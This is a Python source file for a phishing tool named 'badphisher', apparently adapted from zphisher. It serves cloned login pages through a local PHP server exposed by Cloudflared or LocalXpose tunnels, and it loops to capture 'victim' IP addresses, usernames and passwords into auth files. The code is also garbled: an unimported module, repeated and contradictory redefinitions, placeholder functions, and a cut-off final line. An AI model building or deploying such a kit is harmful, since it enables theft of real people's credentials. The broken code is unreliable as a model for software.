import os
import shutil
import sys
import signal
import subprocess
import requests
import tarfile
import time
import zipfile
import platform

version = "1.0.0"
HOST = '127.0.0.1'
PORT = '8080'

# ANSI colors (FG & BG)
RED = '\033[31m'
GREEN = '\033[32m'
ORANGE = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
BLACK = '\033[30m'
REDBG = '\033[41m'
GREENBG = '\033[42m'
ORANGEBG = '\033[43m'
BLUEBG = '\033[44m'
MAGENTABG = '\033[45m'
CYANBG = '\033[46m'
WHITEBG = '\033[47m'
BLACKBG = '\033[40m'
RESETBG = '\033[0m\n'

# Directories
BASE_DIR = os.path.realpath(os.path.dirname(__file__))

# Create directories if they don't exist
server_dir = os.path.join(BASE_DIR, ".server")
auth_dir = os.path.join(BASE_DIR, "auth")
www_dir = os.path.join(server_dir, "www")

os.makedirs(server_dir, exist_ok=True)
os.makedirs(auth_dir, exist_ok=True)

# Remove www directory if it exists and recreate it
if os.path.exists(www_dir):
    shutil.rmtree(www_dir)
os.makedirs(www_dir)

# Remove logfile
logfile_loclx = os.path.join(server_dir, ".loclx")
logfile_cld = os.path.join(server_dir, ".cld.log")

for logfile in [logfile_loclx, logfile_cld]:
    if os.path.exists(logfile):
        os.remove(logfile)
        
# ANSI colors (FG & BG)
RED = '\033[31m'
WHITE = '\033[37m'
RESET = '\033[0m'

def reset_color():
    """Reset terminal colors."""
    print(f"{RESET}", end='')

def exit_on_signal(signum, frame):
    """Exit handler for SIGINT and SIGTERM."""
    if signum == signal.SIGINT:
        print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Interrupted.")
    elif signum == signal.SIGTERM:
        print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Terminated.")
    
    reset_color()
    sys.exit(0)

# Set up signal handlers
signal.signal(signal.SIGINT, exit_on_signal)
signal.signal(signal.SIGTERM, exit_on_signal)

def kill_pid():
    """Kill already running processes."""
    check_pid = ["php", "cloudflared", "loclx"]
    
    for process in check_pid:
        try:
            # Check if the process is running
            pid = subprocess.check_output(["pidof", process]).strip()
            if pid:
                # Kill the process
                subprocess.run(["killall", process], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            # Process is not running, ignore
            pass

def check_update(version, base_dir):
    """Check for a newer release and update if available."""
    release_url = 'https://api.github.com/repos/Bereket635/badphisher/releases/latest'
    
    print("\n[+] Checking for update: ", end="")
    
    try:
        response = requests.get(release_url)
        response.raise_for_status()
        new_version = response.json()["badphisher"]
        
        tarball_url = f"https://github.com/Bereket635/badphisher/archive/refs/tags/{new_version}.tar.gz"
        
        if new_version != version:
            print("update found")
            time.sleep(2)
            print("[+] Downloading Update...")
            
            # Download the update
            tarball_path = os.path.join(os.path.expanduser("~"), ".badphisher.tar.gz")
            download_response = requests.get(tarball_url, allow_redirects=True)
            download_response.raise_for_status()
            
            with open(tarball_path, 'wb') as f:
                f.write(download_response.content)

            # Extract the tarball
            if os.path.exists(tarball_path):
                with tarfile.open(tarball_path) as tar:
                    tar.extractall(path=base_dir)
                
                os.remove(tarball_path)
                time.sleep(3)
                clear_console()
                print("\n[+] Successfully updated! Run zphisher again\n")
                exit(1)
            else:
                print("[!] Error occurred while downloading.")
                exit(1)
        else:
            print("up to date")
            time.sleep(0.5)
    except requests.RequestException as e:
        print(f"[!] Error occurred: {e}")
        exit(1)

def clear_console():
    """Clear the console."""
    os.system('cls' if os.name == 'nt' else 'clear')
   
def check_status():
    """Check internet status and call check_update if online."""
    print("\n[+] Internet Status: ", end="")
    
    try:
        response = requests.head("https://api.github.com", timeout=3)
        response.raise_for_status()  # Raise an error for bad responses
        
        print("Online")
        # Call check_update function here with current version and base directory
        current_version = "v1.0.0"  # Replace with actual version
        base_directory = "badphisher"     # Replace with actual base directory
        check_update(current_version, base_directory)
        
    except requests.RequestException:
        print("Offline")
        
def install_package(package):
    """Install a package using the appropriate package manager."""
    try:
        if os.path.exists("/data/data/com.termux/files/home"):
            # Check for proot and ncurses-utils
            if not is_command_available("proot"):
                print(f"\n[+] Installing package: proot")
                subprocess.run(["pkg", "install", "proot", "resolv-conf", "-y"], check=True)

            if not is_command_available("tput"):
                print(f"\n[+] Installing package: ncurses-utils")
                subprocess.run(["pkg", "install", "ncurses-utils", "-y"], check=True)

        # List of required packages
        required_packages = ["php", "curl", "unzip"]
        for pkg in required_packages:
            if not is_command_available(pkg):
                print(f"\n[+] Installing package: {pkg}")
                install_with_package_manager(pkg)

    except subprocess.CalledProcessError as e:
        print(f"[!] Error installing packages: {e}")
        sys.exit(1)

def is_command_available(command):
    """Check if a command is available in the system."""
    return subprocess.call(["command", "-v", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

def install_with_package_manager(package):
    """Install a package using the appropriate package manager."""
    package_managers = {
        "pkg": ["pkg", "install", package, "-y"],
        "apt": ["sudo", "apt", "install", package, "-y"],
        "apt-get": ["sudo", "apt-get", "install", package, "-y"],
        "pacman": ["sudo", "pacman", "-S", package, "--noconfirm"],
        "dnf": ["sudo", "dnf", "-y", "install", package],
        "yum": ["sudo", "yum", "-y", "install", package]
    }

    for manager, command in package_managers.items():
        if is_command_available(manager):
            subprocess.run(command, check=True)
            return

    print(f"[!] Unsupported package manager. Install packages manually.")
    sys.exit(1)
    
def download(url, output):
    """Download a file from a URL and extract it if necessary."""
    file_name = os.path.basename(url)

    # Remove existing files if they exist
    if os.path.exists(file_name) or os.path.exists(output):
        os.remove(file_name)
        os.remove(output)

    try:
        # Download the file
        response = requests.get(url, allow_redirects=True, verify=False)
        response.raise_for_status()  # Raise an error for bad responses

        with open(file_name, 'wb') as file:
            file.write(response.content)

        # Check the file extension and extract if necessary
        if file_name.endswith('.zip'):
            with zipfile.ZipFile(file_name, 'r') as zip_ref:
                zip_ref.extractall('.server')
                shutil.move(os.path.join('.server', output), '.server/')
        elif file_name.endswith('.tgz'):
            with tarfile.open(file_name, 'r:gz') as tar_ref:
                tar_ref.extractall('.server')
                shutil.move(os.path.join('.server', output), '.server/')
        else:
            shutil.move(file_name, os.path.join('.server', output))

        # Make the output executable
        os.chmod(os.path.join('.server', output), 0o755)

    except Exception as e:
        print(f"\n[!] Error occurred while downloading {output}: {e}")
        exit(1)
        
 
def install_cloudflared():
    """Install Cloudflared."""
    if os.path.exists(".server/cloudflared"):
        print("\n[+] Cloudflared already installed.")
    else:
        print("\n[+] Installing Cloudflared...")
        arch = platform.machine()

        if 'arm' in arch or 'Android' in arch:
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm', 'cloudflared')
        elif arch == 'aarch64':
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64', 'cloudflared')
        elif arch == 'x86_64':
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', 'cloudflared')
        else:
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386', 'cloudflared')

def install_localxpose():
    """Install LocalXpose."""
    if os.path.exists(".server/loclx"):
        print("\n[+] LocalXpose already installed.")
    else:
        print("\n[+] Installing LocalXpose...")
        arch = platform.machine()

        if 'arm' in arch or 'Android' in arch:
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip', 'loclx')
        elif arch == 'aarch64':
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip', 'loclx')
        elif arch == 'x86_64':
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip', 'loclx')
        else:
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip', 'loclx')
            

def clear_console():
    """Clear the console based on the operating system."""
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    """Display a banner. Customize this function as needed."""
    print("°|=======Badphisher=======|°")
def reset_color():
    """Reset terminal colors. Customize this function as needed."""
    # In a terminal, you would typically reset colors here.
    pass

def msg_exit():
    """Display exit message and terminate the program."""
    clear_console()
    banner()
    print("\nThank you for using this tool. Have a good day.\n")
    reset_color()
    sys.exit(0)
    
# Define colors for terminal output
RED = "\033[31m"
WHITE = "\033[37m"
ORANGE = "\033[33m"
GREEN = "\033[32m"
CYAN = "\033[36m"
BLUE = "\033[34m"
RESET = "\033[0m"

# Default port
PORT = 8080  # Set a default port

def clear_console():
    """Clear the console based on the operating system."""
    os.system('cls' if os.name == 'nt' else 'clear')
    
def banner_small():
    """Display a small banner. Customize this function as needed."""
    print("=========badphisher========= ")

def choose_custom_port():
    global PORT
    print()
    P_ANS = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Do You Want A Custom Port {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]: {ORANGE}").strip().lower()
    
    if P_ANS == 'y':
        print("\n")
        CU_P = input(f"{RED}[{WHITE}-{RED}]{ORANGE} Enter Your Custom 4-digit Port [1024-9999]: {WHITE}")
        
        # Validate the custom port input
        if CU_P.isdigit() and len(CU_P) == 4 and 1024 <= int(CU_P) <= 9999:
            PORT = int(CU_P)
            print()
        else:
            print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Invalid 4-digit Port: {CU_P}, Try Again...{WHITE}")
            time.sleep(2)
            clear_console()
            banner_small()
            choose_custom_port()
    else:
        print(f"\n\n{RED}[{WHITE}-{RED}]{BLUE} Using Default Port {PORT}...{WHITE}\n")

def setup_site(website, host):
    """Set up the website and start the PHP server."""
    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Setting up server...{WHITE}")
    
    # Copy files (simulated here)
    subprocess.run(['cp', '-r', f'.sites/{website}/.', '.server/www/'])
    subprocess.run(['cp', '-f', '.sites/ip.php', '.server/www/'])
    
    print(f"{RED}[{WHITE}-{RED}]{BLUE} Starting PHP server...{WHITE}")
    
    # Start the PHP server
    os.chdir('.server/www')
    subprocess.Popen(['php', '-S', f'{host}:{PORT}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    

# Define colors for terminal output
RED = "\033[31m"
WHITE = "\033[37m"
GREEN = "\033[32m"
BLUE = "\033[34m"
ORANGE = "\033[33m"
RESET = "\033[0m"

def capture_ip():
    """Capture the IP address from the ip.txt file and save it."""
    try:
        with open('.server/www/ip.txt', 'r') as ip_file:
            ip_data = ip_file.read()
            # Extract IP using regex
            ip_match = re.search(r'IP: (\S+)', ip_data)
            if ip_match:
                ip = ip_match.group(1).strip()
                print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Victim's IP : {BLUE}{ip}")
                print(f"{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/ip.txt")
                
                # Append IP to auth/ip.txt
                with open('auth/ip.txt', 'a') as auth_ip_file:
                    auth_ip_file.write(ip + '\n')
            else:
                print(f"{RED}[{WHITE}!{RED}]{WHITE} No IP found in .server/www/ip.txt")
    except FileNotFoundError:
        print(f"{RED}[{WHITE}!{RED}]{WHITE} File not found: .server/www/ip.txt")

def capture_creds():
    """Capture credentials from usernames.txt and save them."""
    try:
        with open('.server/www/usernames.txt', 'r') as creds_file:
            creds_data = creds_file.read()
            
            # Extract username and password using regex
            account_match = re.search(r'Username:\s*(\S+)', creds_data)
            password_match = re.search(r'Pass:\s*(\S+)', creds_data)

            if account_match and password_match:
                account = account_match.group(1).strip()
                password = password_match.group(1).strip()
                
                print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Account : {BLUE}{account}")
                print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Password : {BLUE}{password}")
                print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/usernames.dat")
                
                # Append credentials to auth/usernames.dat
                with open('auth/usernames.dat', 'a') as auth_creds_file:
                    auth_creds_file.write(f"Username: {account}, Password: {password}\n")
                
                print(f"{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Next Login Info, {BLUE}Ctrl + C {ORANGE}to exit.")
            else:
                print(f"{RED}[{WHITE}!{RED}]{WHITE} No credentials found in .server/www/usernames.txt")
    except FileNotFoundError:
        print(f"{RED}[{WHITE}!{RED}]{WHITE} File not found: .server/www/usernames.txt")
        
# Define colors for terminal output
RED = "\033[31m"
WHITE = "\033[37m"
GREEN = "\033[32m"
BLUE = "\033[34m"
ORANGE = "\033[33m"
CYAN = "\033[36m"
RESET = "\033[0m"

HOST = "localhost"  # Set your host here
PORT = "8080"       # Set your port here

def capture_data():
    """Continuously check for IP and login information."""
    print(f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Login Info, {BLUE}Ctrl + C {ORANGE}to exit...")
    while True:
        if os.path.exists(".server/www/ip.txt"):
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Victim IP Found !")
            capture_ip()
            os.remove(".server/www/ip.txt")
        
        time.sleep(0.75)

        if os.path.exists(".server/www/usernames.txt"):
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Login info Found !!")
            capture_creds()
            os.remove(".server/www/usernames.txt")
        
        time.sleep(0.75)

def start_cloudflared():
    """Start the Cloudflared tunnel."""
    try:
        if os.path.exists(".cld.log"):
            os.remove(".cld.log")

        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
        time.sleep(1)  # Simulate setup_site() function

        print(f"{RED}[{WHITE}-{RED}]{GREEN} Launching Cloudflared...")
        command = f"./.server/cloudflared tunnel -url {HOST}:{PORT} --logfile .server/.cld.log"
        
        if subprocess.run(["command", "-v", "termux-chroot"], stdout=subprocess.PIPE).returncode == 0:
            command = f"termux-chroot {command}"
        
        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(8)
        with open(".server/.cld.log", "r") as log_file:
            log_data = log_file.read()
            cldflr_url_match = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_data)
            if cldflr_url_match:
                cldflr_url = cldflr_url_match.group(0)
                custom_url(cldflr_url)  # Define this function to handle the URL
                capture_data()
    except Exception as e:
        print(f"{RED}[{WHITE}!{RED}]{WHITE} Error starting Cloudflared: {e}")

def localxpose_auth():
    """Authenticate with LocalXpose."""
    subprocess.Popen(["./.server/loclx", "-help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    auth_f = ".localxpose/.access" if os.path.isdir(".localxpose") else f"{os.path.expanduser('~')}/.localxpose/.access"

    try:
        result = subprocess.run(["./.server/loclx", "account", "status"], capture_output=True, text=True)
        if "Error" in result.stdout:
            print(f"\n\n{RED}[{WHITE}!{RED}]{GREEN} Create an account on {ORANGE}localxpose.io{GREEN} & copy the token\n")
            time.sleep(3)
            loclx_token = input(f"{RED}[{WHITE}-{RED}]{ORANGE} Input Loclx Token: {ORANGE}").strip()
            if loclx_token == "":
                print(f"\n{RED}[{WHITE}!{RED}]{RED} You have to input Localxpose Token.")
                time.sleep(2)
                tunnel_menu()  # Define this function to handle the menu
            else:
                with open(auth_f, "w") as auth_file:
                    auth_file.write(loclx_token)
    except Exception as e:
        print(f"{RED}[{WHITE}!{RED}]{WHITE} Error during LocalXpose authentication: {e}")
        
     
# Define colors for terminal output
RED = "\033[31m"
WHITE = "\033[37m"
GREEN = "\033[32m"
CYAN = "\033[36m"
ORANGE = "\033[33m"
RESET = "\033[0m"

HOST = "localhost"  # Set your host here
PORT = "8080"       # Set your port here

def cusport():
    """Function to set or customize the port (placeholder)."""
    # Implement the logic to customize the port if needed
    pass

def setup_site():
    """Function to set up the site (placeholder)."""
    # Implement the logic to set up the site
    pass

def custom_url(loclx_url):
    """Handle the custom URL (placeholder)."""
    print(f"{RED}[{WHITE}-{RED}]{GREEN} LocalXpose URL: {CYAN}{loclx_url}{RESET}")

def capture_data():
    """Continuously check for IP and login information."""
    print(f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Login Info, {BLUE}Ctrl + C {ORANGE}to exit...")
    while True:
        if os.path.exists(".server/www/ip.txt"):
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Victim IP Found!")
            capture_ip()  # Define this function
            os.remove(".server/www/ip.txt")
        
        time.sleep(0.75)

        if os.path.exists(".server/www/usernames.txt"):
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Login info Found!!")
            capture_creds()  # Define this function
            os.remove(".server/www/usernames.txt")
        
        time.sleep(0.75)

def start_loclx():
    """Start LocalXpose tunnel."""
    cusport()
    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
    time.sleep(1)
    
    setup_site()
    time.sleep(1)

    opinion = input(f"{RED}[{WHITE}?{RED}]{O